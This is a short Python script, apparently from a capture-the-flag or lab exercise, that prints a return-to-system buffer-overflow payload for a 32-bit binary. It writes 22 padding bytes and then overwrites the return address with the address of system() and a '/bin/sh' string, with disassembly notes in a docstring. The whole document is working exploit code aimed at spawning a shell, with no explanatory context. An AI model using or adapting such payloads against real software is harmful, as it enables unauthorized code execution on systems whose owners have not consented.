import sys
sys.stdout.buffer.write(b'A'*22)
sys.stdout.buffer.write(0x804fef0.to_bytes(4,byteorder = 'little'))
sys.stdout.buffer.write(b'A'*4)
sys.stdout.buffer.write(0x80b0bcc.to_bytes(4,byteorder = 'little'))
"""
0x08048ca7 (return address of vulnerable)
0x08048c12 <+29>:    call   0x804fef0 <system>
./bin/sh
"""